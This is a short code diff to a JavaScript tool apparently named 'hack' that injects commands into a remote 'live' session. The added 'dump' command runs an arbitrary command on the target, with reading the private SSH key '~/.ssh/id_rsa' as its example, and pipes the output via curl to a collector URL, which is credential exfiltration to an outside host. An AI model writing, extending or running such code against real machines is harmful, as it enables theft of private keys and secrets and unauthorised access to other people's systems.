@@ -32,6 +32,10 @@ function hack(env, cmd, args) {
     // `hack live exec "say hello world"`
     write(env, args[0])
 
+  } else if (cmd === 'dump') {
+    // `hack live dump "cat ~/.ssh/id_rsa"`
+    write(env, "echo " + JSON.stringify("$(" + args[0] + ")") + " | curl --data-binary @- " + url + "/dump")
+
   } else if (cmd == 'reset') {
     // `hack live reset`
      write(env, [
